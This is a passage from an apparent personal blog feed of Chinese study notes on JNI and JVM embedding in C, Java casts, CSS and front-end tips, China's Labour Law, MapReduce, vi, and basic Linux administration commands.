"([C)V"); if (cid == NULL) &#123; return NULL; /* exception thrown */ &#125; &#125; /* Create a char[] that holds the string characters */ elemArr = (*env)-&gt;NewCharArray(env, len); if (elemArr == NULL) &#123; return NULL; /* exception thrown */ &#125; (*env)-&gt;SetCharArrayRegion(env, elemArr, 0, len, chars); /* Construct a java.lang.String object */ result = (*env)-&gt;NewObject(env, stringClass, cid, elemArr); /* Free local references */ (*env)-&gt;DeleteLocalRef(env, elemArr); (*env)-&gt;DeleteLocalRef(env, stringClass); return result; &#125;``` 当MyNewString方法第一次被调用时，我们计算java.lang.String的构造方法的ID，并存储在静态变量cid中。- 类的静态初始化过程中缓存字段和方法ID我们在使用时缓存字段和方法的ID的话，每次本地方法被调用时都要检查ID是否已经被缓存。许多情况下，在字段ID和方法ID被使用前就初始化是很方便的。VM在调用一个类的方法和字段之前，都会执行类的静态初始化过程，所以在静态初始化该类的过程中计算并缓存字段ID和方法ID是个不错的选择。例如，为了缓存InstanceMethodCall.callback的方法ID，我们引入了一个新的本地方法initIDs，这个方法在InstanceMethodCall的静态初始化过程中被调用。代码如下：``` Cclass InstanceMethodCall &#123; private static native void initIDs(); private native void nativeMethod(); private void callback() &#123; System.out.println("In Java"); &#125; public static void main(String args[]) &#123; InstanceMethodCall c = new InstanceMethodCall(); c.nativeMethod(); &#125; static &#123; System.loadLibrary("InstanceMethodCall"); initIDs(); &#125; &#125;与4.2节中的代码相比，上面这段代码多了两行，initIDs方法简单地计算并缓存方法ID：jmethodID MID_InstanceMethodCall_callback; JNIEXPORT void JNICALL Java_InstanceMethodCall_initIDs(JNIEnv *env, jclass cls) &#123; MID_InstanceMethodCall_callback = (*env)-&gt;GetMethodID(env, cls, "callback", "()V"); &#125;VM进行静态初始化时在调用任何方法前调用initIDs，这样方法ID就被缓存了全局变量中，本地方法的实现就不必再进行ID计算：JNIEXPORT void JNICALL Java_InstanceMethodCall_nativeMethod(JNIEnv *env, jobject obj) &#123; printf("In C\n"); (*env)-&gt;CallVoidMethod(env, obj, MID_InstanceMethodCall_callback); &#125; 把一个JVM嵌入到本地程序中一个JVM可以看作就是一个本地库。本地程序可以链接这个库，然后通过“调用接口”（invocation interface）来加载JVM。实际上，JDK中标准的启动器也就是一段简单的链接了JVM的C代码。启动器解析命令、加载JVM、并通过“调用接口”（invocation interface）运行JAVA程序。创建JVM我们用下面这段C代码来加载一个JVM并调用Prog.main方法来演示如何使用调用接口。 public class Prog { public static void main(String[] args) { System.out.println(&quot;Hello World &quot; + args[0]); } }下面是启动器123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139#include &lt;jni.h&gt; #define PATH_SEPARATOR ';' /* define it to be ':' on Solaris */ #define USER_CLASSPATH "." /* where Prog.class is */ main() &#123; JNIEnv *env; JavaVM *jvm; jint res; jclass cls; jmethodID mid; jstring jstr; jclass stringClass; jobjectArray args; #ifdef JNI_VERSION_1_2 JavaVMInitArgs vm_args; JavaVMOption options[1]; options[0].optionString = "-Djava.class.path=" USER_CLASSPATH; vm_args.version = 0x00010002; vm_args.options = options; vm_args.nOptions = 1; vm_args.ignoreUnrecognized = JNI_TRUE; /* Create the Java VM */ res = JNI_CreateJavaVM(&amp;jvm, (void**)&amp;env, &amp;vm_args); #else JDK1_1InitArgs vm_args; char classpath[1024]; vm_args.version = 0x00010001; JNI_GetDefaultJavaVMInitArgs(&amp;vm_args); /* Append USER_CLASSPATH to the default system class path */ sprintf(classpath, "%s%c%s", vm_args.classpath, PATH_SEPARATOR, USER_CLASSPATH); vm_args.classpath = classpath; /* Create the Java VM */ res = JNI_CreateJavaVM(&amp;jvm, &amp;env, &amp;vm_args); #endif /* JNI_VERSION_1_2 */ if (res &lt; 0) &#123; fprintf(stderr, "Can't create Java VM\n"); exit(1); &#125; cls = (*env)-&gt;FindClass(env, "Prog"); if (cls == NULL) &#123; goto destroy; &#125; mid = (*env)-&gt;GetStaticMethodID(env, cls, "main", "([Ljava/lang/String;)V"); if (mid == NULL) &#123; goto destroy; &#125; jstr = (*env)-&gt;NewStringUTF(env, " from C!"); if (jstr == NULL) &#123; goto destroy; &#125; stringClass = (*env)-&gt;FindClass(env, "java/lang/String"); args = (*env)-&gt;NewObjectArray(env, 1, stringClass, jstr); if (args == NULL) &#123; goto destroy; &#125; (*env)-&gt;CallStaticVoidMethod(env, cls, mid, args); destroy: if ((*env)-&gt;ExceptionOccurred(env)) &#123; (*env)-&gt;ExceptionDescribe(env); &#125; (*jvm)-&gt;DestroyJavaVM(jvm); &#125; 上面的代码有条件地编译一个初始化JDK1_1InitArgs这个structure。这个structure是JDK1.1下特有的，尽管JDK1.2也会支持，但JDK1.2引入了一个更通用的叫作JavaVMInitArgs的VM初始化structure。 常量JNI_VERSION_1_2在JDK1.2下定义，JDK1.1下是没有的。 当目标平台是1.1时，C代码首先调用JNI_GetDefaultJavaVMInitArgs来获得默认的VM设置。这个调用会返回heap size、stack size、默认类路径等信息，并把这些信息存放在参数vm_args中。然后我们把Prog.class所在的目录附加到vm_args.classpath中。 当平台目标是1.2时，C代码创建了一个JavaVMInitArgs的structure。VM的初始化参数被存放在一个JavaVMOption数组中。 设置完VM初始化structure后，C程序调用JNI_CreateJavaVM来加载和初始化JVM，传入的前两个参数： 1、 接口指针jvm，指向新创建的JVM。 2、 当前线程的JNIEnv接口指针env。本地代码通过env指针访问JNI函数。 当函数JNI_CreateJavaVM函数成功返回时，当前本地线程已经把自己的控制权交给JVM。这时，它会就像一个本地方法一样运行。以后就可以通过JNI函数来启动Prog.main方法。 接着，程序调用DestroyJavaVM函数来unloadJVM。不幸的是，在JDK1.1和JDK1.2中你不能unloadJVM，它会一直返回一个错误码。 运行上面的程序，产生如下输出： Hello World from C!]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数据类型向下转换(强制类型转换)原理]]></title>
    <url>%2F2017%2F06%2F04%2Fsecond%2F</url>
    <content type="text"><![CDATA[强制转换long a=414873288704L;a的原码:0000 0000 0000 0000 0000 0000 0110 0000 1001 1000 0110 0000 0000 0000 0000 0000强制截取后32位这是需要转换为int的补码 1001 1000 0110 0000 0000 0000 0000 0000进行减一操作获得反码 1001 1000 0101 1111 1111 1111 1111 1111获得原码 1110 0111 1010 0000 0000 0000 0000 0000反码的反码就是反码的原码。]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[web前端查漏补缺(一)]]></title>
    <url>%2F2017%2F06%2F02%2Ffirst%2F</url>
    <content type="text"><![CDATA[栅格系统自适应xs 1170px 大型设备手机端屏幕小于768px CSS sprites允许你将一个页面涉及到的所有零星图片都包含到一张大图中去利用CSS的”background-image”,”background-repeat”,”background-position”的组合进行背景定位CSS Sprites整理起来更为方便，同一个按钮不同状态的图片也不需要一个个切割出来并个别命名 CSS的flexbox布局12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970HTML&lt;h1&gt;不等宽不等高（定宽） &lt;/h1&gt;&lt;div class="box box1"&gt; &lt;div class="flex-box" style="width:100px;height:100px;"&gt;1&lt;/div&gt; &lt;div class="flex-box" style="width:250px;height:250px;"&gt;3&lt;/div&gt; &lt;div class="flex-box" style="width:200px;height:200px;"&gt;2&lt;/div&gt; &lt;div class="flex-box" style="width:350px;height:350px;"&gt;5&lt;/div&gt; &lt;div class="flex-box" style="width:400px;height:400px;"&gt;4&lt;/div&gt; &lt;div class="flex-box" style="width:500px;height:500px;"&gt;7&lt;/div&gt; &lt;div class="flex-box" style="width:450px;height:450px;"&gt;6&lt;/div&gt;&lt;/div&gt;&lt;h1&gt;不 等宽 等高（ 定宽+变宽）&lt;/h1&gt;&lt;div class="box box2"&gt; &lt;div class="left flex-box"&gt;left&lt;/div&gt; &lt;div class="center flex-box"&gt;center&lt;/div&gt; &lt;div class="right flex-box"&gt;right&lt;/div&gt;&lt;/div&gt;&lt;h1&gt;等宽 等高（变宽） &lt;/h1&gt;&lt;div class="box box3"&gt; &lt;div class="flex-box"&gt;1&lt;/div&gt; &lt;div class="flex-box"&gt;2&lt;/div&gt; &lt;div class="flex-box"&gt;3&lt;/div&gt;&lt;/div&gt;&lt;h1&gt;等宽不等高 （定宽） &lt;/h1&gt;&lt;div class="box box4"&gt; &lt;div class="flex-box" style="height:100px;"&gt;1&lt;/div&gt; &lt;div class="flex-box" style="height:250px;"&gt;2&lt;/div&gt; &lt;div class="flex-box" style="height:400px;"&gt;3&lt;/div&gt; &lt;div class="flex-box" style="height:350px;"&gt;4&lt;/div&gt; &lt;div class="flex-box" style="height:300px;"&gt;5&lt;/div&gt; &lt;div class="flex-box" style="height:500px;"&gt;6&lt;/div&gt; &lt;div class="flex-box" style="height:450px;"&gt;7&lt;/div&gt;&lt;/div&gt;CSS.box &#123; display: -webkit-flex; display: flex; flex-direction: row; flex-wrap:nowrap; justify-content: flex-start; align-items: stretch; align-content: flex-start;&#125;.flex-box&#123; height:200px; width:500px; background-color:#ddd; border:1px solid #fff;&#125;.box1 .flex-box&#123; background-color:#E0BCDB;&#125;.box2 .flex-box&#123; background-color:#E0B6B6; width:800px; &#125;.left&#123; flex-shrink:0;//空间不足时不允许左侧缩小&#125;.box3 .flex-box&#123; background-color:#ABD9E0; width:900px;&#125;.box4&#123; flex-wrap: wrap;//空间不足换行&#125;.box4 .flex-box&#123; background-color:#dadada;&#125; DHTML的动态样式使网页作者改变内容的外部特征而不强制用户再次下载全部内容DHTML 将HTML、JavaScript、DOM以及CSS组合在一起，用户创造动态性更强的网页。 margin-top,padding-top的值是百分比如何计算相对最近父级块级元素的width，相对最近父级块级元素的width可以对元素的margin设置百分数，百分数是相对于父元素的width计算，不管是margin-top/margin-bottom还是margin-left/margin-right。（padding同理）如果没有为元素声明width，在这种情况下，元素框的总宽度包括外边距取决于父元素的width，这样可能得到“流式”页面，即元素的外边距会扩大或缩小以适应父元素的实际大小。如果对这个文档设置样式，使其元素使用百分数外边距，当用户修改浏览窗口的宽度时，外边距会随之扩大或缩小。为什么margin-top/margin-bottom的百分数也是相对于width而不是height呢？CSS权威指南中的解释：我们认为，正常流中的大多数元素都会足够高以包含其后代元素（包括外边距），如果一个元素的上下外边距时父元素的height的百分数，就可能导致一个无限循环，父元素的height会增加，以适应后代元素上下外边距的增加，而相应的，上下外边距因为父元素height的增加也会增加，如果循环。 HTML5标准的标签123sectionaudiovideo 兼容性1display:inline IE7不兼容 CSS3中要使元素由一种样式转换成另一种样式使用效果属性transition 选择器优先级ID选择器&gt;Class选择器=伪类&gt;标签选择器 bootstrap table应用.table 为任意table添加基本样式.table-striped 在tbody内添加斑马线形式的条纹(IE8不支持).table-bordered 为所有表格的单元格添加边框.table-hover 在tbody内的任一行启用鼠标悬停状态.table-condensed 让表格更加紧凑.from-control.input-group-[lg|sm|xs].input-group-addon CSS3新增属性1234box-shadowtext-shadowborder-radiusrgba iframe使用场景1：典型系统结构，左侧是功能树，右侧就是一些常见的table或者表单之类的。为了每一个功能，单独分离出来，采用iframe。2：ajax上传文件。3：加载别的网站内容，例如google广告，网站流量分析。4： 在上传图片时，不用flash实现无刷新。5： 跨域访问的时候可以用到iframe，使用iframe请求不同域名下的资源。 置换元素a) 置换元素：浏览器根据元素的标签和属性，来决定元素的具体显示内容。例如：浏览器会根据img标签的src属性的 值来读取图片信息并显示出来，而如果查看(x)html代码，则看不到图片的实际内容；input标签的type属性来决定是显示输入 框，还是单选按钮等。 (x)html中 的img、input、textarea、select、object 都是置换元素。这些元素往往没有实际的内容，即是一个空元素。置换元素在其显示中生成了框，这也就是有的内联元素能够设置宽高的原因。b) 不可替换元素：(x)html 的大多数元素是不可替换元素，即其内容直接表现给用户端（如浏览器）。例如： labellabel中的内容/label 标签label是一个非置换元素，文字label中的内容”将全被显示。 基本em强调表单提交时出发的事件:onsubmit事件而submit是属性值。HTML5不再支持$lt;font$gt;标签.mark高亮显示文本标题标签从h1-h6页面添加样式的方法:内联式、嵌入式、外部引用式。导入样式是针对css文件与css文件之间,@import url(“css/style.css”)html5新增的表单样式:datalist output keygenborder:none 表示边框样式无border:0 表示边框宽度为0]]></content>
      <categories>
        <category>web前端</category>
      </categories>
      <tags>
        <tag>领悟</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[民商《中华人民共和国劳动法》]]></title>
    <url>%2F2017%2F05%2F31%2Ffirst%2F</url>
    <content type="text"><![CDATA[第一章第二条在中华人民共和国境内的企业、个体经济组织（以下统称用人单位）和与之形成劳动关系的劳动者，适用本法。国家机关、事业组织、社会团体和与之建立劳动合同关系的劳动者，依照本法执行。 第一章第三条劳动者享有平等就业和选择职业的权利、取得劳动报酬的权利、休息休假的权利、获得劳动安全卫生保护的权利、接受职业技能培训的权利、享受社会保险和福利的权利、提请劳动争议处理的权利以及法律规定的其他劳动权利。劳动者应当完成劳动任务，提高职业技能，执行劳动安全卫生规程，遵守劳动纪律和职业道德。 第一章第七条劳动者有权依法参加和组织工会。工会代表和维护劳动者的合法权益，依法独立自主地开展活动。 第二章第十一条地方各级人民政府应当采取措施，发展多种类型的职业介绍机构，提供就业服务。 第三章第十六条劳动合同是劳动者与用人单位确立劳动关系、明确双方权利和义务的协议。建立劳动关系应当订立劳动合同。 第三章第十八条（一）违反法律、行政法规的劳动合同；（二）采取欺诈、威胁等手段订立的劳动合同。无效的劳动合同，从订立的时候起，就没有法律约束力。确认劳动合同部分无效的，如果不影响其余部分的效力，其余部分仍然有效。劳动合同的无效，由劳动争议仲裁委员会或者人民法院确认。 第三章第十九条劳动合同应当以书面形式订立，并具备以下条款：（一）劳动合同期限；（二）工作内容；（三）劳动保护和劳动条件；（四）劳动报酬；（五）劳动纪律；（六）劳动合同终止的条件；（七）违反劳动合同的责任。劳动合同除前款规定的必备条款外，当事人可以协商约定其他内容。 第三章第二十条劳动合同的期限分为有固定期限、无固定期限和以完成一定的工作为期限。劳动者在同一用人单位连续工作满十年以上，当事人双方同意延续劳动合同的，如果劳动者提出订立无固定期限的劳动合同，应当订立无固定期限的劳动合同。 第三章第二十一条劳动合同可以约定试用期。试用期最长不得超过六个月。 第三章第二十五条劳动者有下列情形之一的，用人单位可以解除劳动合同：（一）在试用期间被证明不符合录用条件的；（二）严重违反劳动纪律或者用人单位规章制度的；（三）严重失职，营私舞弊，对用人单位利益造成重大损害的；（四）被依法追究刑事责任的。 第三章第二十六条有下列情形之一的，用人单位可以解除劳动合同，但是应当提前三十日以书面形式通知劳动者本人：（一）劳动者患病或者非因工负伤，医疗期满后，不能从事原工作也不能从事由用人单位另行安排的工作的；（二）劳动者不能胜任工作，经过培训或者调整工作岗位，仍不能胜任工作的；（三）劳动合同订立时所依据的客观情况发生重大变化，致使原劳动合同无法履行，经当事人协商不能就变更劳动合同达成协议的。 第三章第二十七条第二十七条 用人单位濒临破产进行法定整顿期间或者生产经营状况发生严重困难，确需裁减人员的，应当提前三十日向工会或者全体职工说明情况，听取工会或者职工的意见，经向劳动行政部门报告后，可以裁减人员。用人单位依据本条规定裁减人员，在六个月内录用人员的，应当优先录用被裁减的人员。 第三章第三十二条有下列情形之一的，劳动者可以随时通知用人单位解除劳动合同：（一）在试用期内的；（二）用人单位以暴力、威胁或者非法限制人身自由的手段强迫劳动的；（三）用人单位未按照劳动合同约定支付劳动报酬或者提供劳动条件的。 第四章第三十六条国家实行劳动者每日工作时间不超过八小时、平均每周工作时间不超过四十四小时的工时制度。 第四章第四十四条有下列情形之一的，用人单位应当按照下列标准支付高于劳动者正常工作时间工资的工资报酬：（一）安排劳动者延长工作时间的，支付不低于工资的百分之一百五十的工资报酬；（二）休息日安排劳动者工作又不能安排补休的，支付不低于工资的百分之二百的工资报酬；（三）法定休假日安排劳动者工作的，支付不低于工资的百分之三百的工资报酬。 第四章第四十五条劳动者连续工作一年以上的，享受带薪年休假。具体办法由国务院规定。 第四章第五十条工资应当以货币形式按月支付给劳动者本人。不得克扣或者无故拖欠劳动者的工资。]]></content>
      <categories>
        <category>法律</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java查漏补缺(一)]]></title>
    <url>%2F2017%2F05%2F31%2Fsecond%2F</url>
    <content type="text"><![CDATA[类型转换1234byte a1=2,a2=4,a3;short s=16;a2=s;a3=a1*a1; byte+byte=int低级向高级是隐式类型转换，高级向低级必须强制类型转换，byte&lt;char&lt;short&lt;ing&lt;long&lt;float&lt;double 异常捕获finally无论怎样使必须执行的。]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数据分析英语必备]]></title>
    <url>%2F2017%2F05%2F30%2Fthird%2F</url>
    <content type="text"><![CDATA[气象分析词汇latitude 纬度longitude 经度station 车站，驻地identifier 标识符elevation 海拔wind direction 风向quality code 质量sky ceiling heightvisibility distance 可见度air temperature 空气湿度dew point temperature 露点湿度atmospheric pressure 大气压力]]></content>
      <categories>
        <category>Hadoop</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[磁盘扇区和磁盘块、块设备]]></title>
    <url>%2F2017%2F05%2F30%2Fsecond%2F</url>
    <content type="text"><![CDATA[简介扇区（block）是驱动可以操作的最小单位，是磁盘级别的。一个磁盘扇区（sector)512个字节（现在有4K的了），扇区（sector)是磁盘的最小存储单位，块(block)是文件系统层的，mkfs时可以设置块的大小.磁盘块(block)应该是类似FAT的簇大小的概念，是操作系统中分配磁盘容量的最小单位. 块(block)是数据存储的最小单位文件系统一般按照 Cluster 大小，有时候也称为 Block 大小来读写数据，这个 Cluster 一般最小的 4K ，大的定为 32K 、 64K 等都可以，主要根据应用的不同。比如 Oracle 的应用一般就用 4K 或 8K 的 Block 大小，大文件读写就用 128K 甚至 256K 都可以。磁盘里面的和文件系统里面的两个都叫block size但是大小是不一样的，磁盘里面一般都是512bytes，文件系统里面的不一定也是512bytes，不同的文件系统所定义的磁盘块的大小也不一样。要明确的是，块是文件系统的抽象，不是磁盘本身的属性。扇区大小则是磁盘的物理属性，它是磁盘设备寻址的最小单元。块设备块设备是i/o设备中的一类，是将信息存储在固定大小的块中，每个块都有自己的地址。I/O设备大致分为两类：块设备和字符设备。块设备将信息存储在固定大小的块中，每个块都有自己的地址。数据块的大小通常在512字节到32768字节之间。块设备的基本特征是每个块都能独立于其它块而读写。磁盘是最常见的块设备。在大多数的UNIX操作系统中，块设备只支持以块为单位的访问方式，如磁盘等.KYLIN支持以字符方式来访问块设备，即支持以字符为单位来读写磁盘等块设备。所以在/dev目录中的块设备，如磁盘等，均以字符设备的外观出现。所以，字符设备和块设备的区别主要体现在KYLIN内核中的管理方式，操作方式和内核/设备驱动接口上。 扇区一个扇区是512字节。有些硬盘厂商会提供4k大小扇区。一个块大小=一个扇区大小*2的n次方。n是可以修改的。操作系统操作需要与内存、硬盘这两种硬件设备打交道。 都需要虚拟一种单位来操作。与内存操作，是虚拟一个页的概念来作为最小单位。与硬盘打交道，就是以块为最小单位。]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MapReduce编程模型]]></title>
    <url>%2F2017%2F05%2F30%2Ffirst%2F</url>
    <content type="text"><![CDATA[MapReduce方法一： 我可以写一个小程序，把所有论文按顺序遍历一遍，统计每一个遇到的单词的出现次数，最后就可以知道哪几个单词最热门了。 这种方法在数据集比较小时，是非常有效的，而且实现最简单，用来解决这个问题很合适。 方法二： 写一个多线程程序，并发遍历论文。 这个问题理论上是可以高度并发的，因为统计一个文件时不会影响统计另一个文件。当我们的机器是多核或者多处理器，方法二肯定比方法一高效。但是写一个多线程程序要比方法一困难多了，我们必须自己同步共享数据，比如要防止两个线程重复统计文件。 方法三： 把作业交给多个计算机去完成。 我们可以使用方法一的程序，部署到N台机器上去，然后把论文集分成N份，一台机器跑一个作业。这个方法跑得足够快，但是部署起来很麻烦，我们要人工把程序copy到别的机器，要人工把论文集分开，最痛苦的是还要把N个运行结果进行整合（当然我们也可以再写一个程序）。 方法四：让MapReduce来帮帮我们吧！ MapReduce本质上就是方法三，但是如何拆分文件集，如何copy程序，如何整合结果这些都是框架定义好的。我们只要定义好这个任务（用户程序），其它都交给MapReduce。 map函数和reduce函数 map函数和reduce函数是交给用户实现的，这两个函数定义了任务本身。 map函数：接受一个键值对（key-value pair），产生一组中间键值对。MapReduce框架会将map函数产生的中间键值对里键相同的值传递给一个reduce函数。 reduce函数：接受一个键，以及相关的一组值，将这组值进行合并产生一组规模更小的值（通常只有一个或零个值）。 统计词频的MapReduce函数的核心代码非常简短，主要就是实现这两个函数。 map(String key, String value): // key: document name // value: document contents for each word w in value: EmitIntermediate(w, “1”); reduce(String key, Iterator values): // key: a word // values: a list of counts int result = 0; for each v in values: result += ParseInt(v); Emit(AsString(result)); 在统计词频的例子里，map函数接受的键是文件名，值是文件的内容，map逐个遍历单词，每遇到一个单词w，就产生一个中间键值对&lt;w, “1”&gt;，这表示单词w咱又找到了一个；MapReduce将键相同（都是单词w）的键值对传给reduce函数，这样reduce函数接受的键就是单词w，值是一串”1”（最基本的实现是这样，但可以优化），个数等于键为w的键值对的个数，然后将这些“1”累加就得到单词w的出现次数。最后这些单词的出现次数会被写到用户定义的位置，存储在底层的分布式存储系统（GFS或HDFS）。 工作原理上图是论文里给出的流程图。一切都是从最上方的user program开始的，user program链接了MapReduce库，实现了最基本的Map函数和Reduce函数。图中执行的顺序都用数字标记了。 1.MapReduce库先把user program的输入文件划分为M份（M为用户定义），每一份通常有16MB到64MB，如图左方所示分成了split0~4；然后使用fork将用户进程拷贝到集群内其它机器上。 2.user program的副本中有一个称为master，其余称为worker，master是负责调度的，为空闲worker分配作业（Map作业或者Reduce作业），worker的数量也是可以由用户指定的。 3.被分配了Map作业的worker，开始读取对应分片的输入数据，Map作业数量是由M决定的，和split一一对应；Map作业从输入数据中抽取出键值对，每一个键值对都作为参数传递给map函数，map函数产生的中间键值对被缓存在内存中。 4.缓存的中间键值对会被定期写入本地磁盘，而且被分为R个区，R的大小是由用户定义的，将来每个区会对应一个Reduce作业；这些中间键值对的位置会被通报给master，master负责将信息转发给Reduce worker。 5.master通知分配了Reduce作业的worker它负责的分区在什么位置（肯定不止一个地方，每个Map作业产生的中间键值对都可能映射到所有R个不同分区），当Reduce worker把所有它负责的中间键值对都读过来后，先对它们进行排序，使得相同键的键值对聚集在一起。因为不同的键可能会映射到同一个分区也就是同一个Reduce作业（谁让分区少呢），所以排序是必须的。 6.reduce worker遍历排序后的中间键值对，对于每个唯一的键，都将键与关联的值传递给reduce函数，reduce函数产生的输出会添加到这个分区的输出文件中。 6.当所有的Map和Reduce作业都完成了，master唤醒正版的user program，MapReduce函数调用返回user program的代码。 所有执行完毕后，MapReduce输出放在了R个分区的输出文件中（分别对应一个Reduce作业）。用户通常并不需要合并这R个文件，而是将其作为输入交给另一个MapReduce程序处理。整个过程中，输入数据是来自底层分布式文件系统（GFS）的，中间数据是放在本地文件系统的，最终输出数据是写入底层分布式文件系统（GFS）的。而且我们要注意Map/Reduce作业和map/reduce函数的区别：Map作业处理一个输入数据的分片，可能需要调用多次map函数来处理每个输入键值对；Reduce作业处理一个分区的中间键值对，期间要对每个不同的键调用一次reduce函数，Reduce作业最终也对应一个输出文件。 总结： 通过以上你是否了解什么是MapReduce了那，什么是key,怎么过滤有效数据，怎么得到自己想要的数据。MapReduce是一种编程思想，可以使用java来实现，C++来实现。Map的作用是过滤一些原始数据，Reduce则是处理这些数据，得到我们想要的结果，比如你想造出番茄辣椒酱。也就是我们使用hadoop，比方来进行日志处理之后，得到我们想要的关心的数据原文地址:http://blog.csdn.net/lifuxiangcaohui/article/details/22675437]]></content>
      <categories>
        <category>Hadoop</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vi编辑器]]></title>
    <url>%2F2017%2F05%2F28%2Ffirst%2F</url>
    <content type="text"><![CDATA[命令模式控制屏幕光标的移动，字符或光标的删除，移动复制某区段及进入编辑模式下，或者到底线命令模式。(1)移动光标h、j、k、l，分别控制光标左、下、上、右移一格。按Ctrl+B：屏幕往后移动一页。[常用]按Ctrl+F：屏幕往前移动一页。[常用]按Ctrl+U：屏幕往后移动半页。按Ctrl+D：屏幕往前移动半页。按 0 （数字零）：移动文章的开头。[常用]按 G：移动到文章的最后。[常用]按 w：光标跳到下个word的开头。[常用]按 e：光标跳到下个word的字尾。按 b：光标回到上个word的开头。按 $：移到光标所在行的行尾。[常用]按 ^：移到该行第一个非空白的字符。按 0：移到该行的开头位置。[常用]按 #：移到该行的第#个位置，例：51、121。[常用](2)删除文字x：每按一次删除光标所在位置的后面一个字符。[超常用]#x：例如，6x 表删除光标所在位置的后面6个字符。[常用]X：大字的X，每按一次删除光标所在位置的前面一个字符。#X：例如，20X 表删除光标所在位置的前面20个字符。dd：删除光标所在行。[超常用]#dd：例如，6dd表删除从光标所在的该行往下数6行之文字。[常用](3)复制yw：将光标所在处到字尾的字符复制到缓冲区中。（想在和#x、#X的功能相反）p：将缓冲区内的字符粘贴到光标所在位置（指令‘yw’与‘p必须搭配使用）。yy：复制光标所在行。[超常用]p：复制单行到您想粘贴之处。（指令‘yy’与‘p’必须搭配使用）#yy：如：6yy表示拷贝从光标所在的该行往下数6行之文字。[常用]p:复制多行到您想粘贴之处。（指令‘#yy’与‘p’必须搭配使用）“ayy：将复制行放入buffer a, vi提供buffer功能，可将常用的数据存在buffer“ap：将放在buffer a的数据粘贴。“b3yy：将三行数据存入buffer b。“b3p：将存在buffer b的资料粘贴(4)取代r: 取代光标所在处的字符：[常用]R：取代字符直到按Esc为止。复原上一个指令u：假如您误操作一个指令，可以马上按u，回复到上一个操作。[超常用].: .可以重复执行上一次的指令。(5)更改cw：更改光标所在处的字到字尾$处。c#w：例如，c3w代表更改3个字。(6)跳至指定行Ctrl+G：列出光标所在行的行号。#G：例如，15G，表示移动光标至文章的第15行行首。[常用] 编辑模式文字数据输入在命令模式下按‘i’、‘a’或‘o’三键就可进入Insert mode。这时候您就可以开始输入文字了。i: 插入，从目前光标所在之处插入所输入的文字。a: 增加，目前光标所在的下一个字开始输入文字。o: 插入新的一行，从行首开始输入文字。 底线命令模式可按冒号“：”到底线命令模式，例如：:w filename (输入“w filename”，将文章存入指定的文件名filename):wq (输入“wq”，因为进入之时已经指定文件名testfile，所以会写入testfile并离开vi):q! (输入“q!”，强制离开并放弃编辑的文件)读者您要使用Last line mode之前，请记得先按Esc键确定您已经处于Command mode下后，再按冒号“：”或“/”或“？”三键的其中一键进入Last line mode。1．列出行号set nu: 输入“set nu”后，会在文章的每一行前面列出行号。2．跳到文章的某一行#：井号代表一个数字，在Last line mode提示符号“：”前输入数字，再按Enter就会跳到该行了，如：15[Enter]就会跳到文章的第15行。[常用]3．寻找字符串/关键字：先按/，再输入您想寻找的字，如果第一次找的关键字不是您相尽可能的，可以一直按n会往下寻找到您要的关键字为止。？关键字：先按？，再输入您想寻找的字，如果第一次找的关键字不是您想要的，可以按n会往前寻找到您要的关键字为止。4．取代字符串1，$s/string/replae/g：在last line mode输入“1，$s/string/replace/g”会将全文的string字符串取代为replace字符串，其中1,$s就是指搜寻区间为文章从头至尾的意思，g则是表示全部取代不必确认。%s/string/replace/c：同样会将全文的string字符串取代为replace字符串，和上面指令不同的地方是，%s和1,$s是相同的功能，c则是表示要替代之前必须再次确认是否取代。1,20s/string/replace/g：将1至20行间的string替代为relpace字符串。5．存文件w：在last line mode提示符号“：”前按w即可将文件存起来。[超常用]#，# w filename：如果您想摘取文章的某一段，存成另一个文件，可用这个指令#代表行号，例如30,50 w nice，将您正在编辑文章的第30~50行存成nice这个文件。6．离开q：按q就离开，有时如果无法离开vi，可搭配“！：强置离开vi，如“q！”qw：一般建议离开时，搭配w一起使用，如此离开时还可存文件。[常用]]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux命令总结(二)]]></title>
    <url>%2F2017%2F05%2F28%2Fsecond%2F</url>
    <content type="text"><![CDATA[linux用户操作useradd test添加test用户passwd test 添加test密码userdel -r test删除test用户su root 转到root用户whereis 字符串whois linux网络管理ifconfig -a 显示网络所有信息/etc/modprobe.conf 网络配置文件ifconfig eth0 192.168.83.126设置网卡ip地址route add default gw 192.168.83.1设置默认网关ifconfig eth0 down 关闭网卡ifconfig eth0 up 启用网卡 linux系统操作shutdown -h now 关机shutdown -r now 重启 linux重定义命令alias dir=’ls’ linux下载wget http://www.lzhword.cn/sq.zipwget -t http://www.lzhword.cn/sq.zipwget –limit-rate=123kb http://www.lzhword.cn/sq.ziprpm 程序名 程序安装apt-get 程序名 程序安装yum 程序名 程序安装 linux解压缩tar -c 创建新的归档文件tar -t,–list 列出归档文件内容目录tar -r,–append 将文件附加到归档文件之后tar -u,–update 只附加比归档中新的文件tar -x,–extract,–get 从归档文件中解析文件tar -czf 压缩tar -xzf 解压]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[windows操作(一)]]></title>
    <url>%2F2017%2F05%2F28%2Fthird%2F</url>
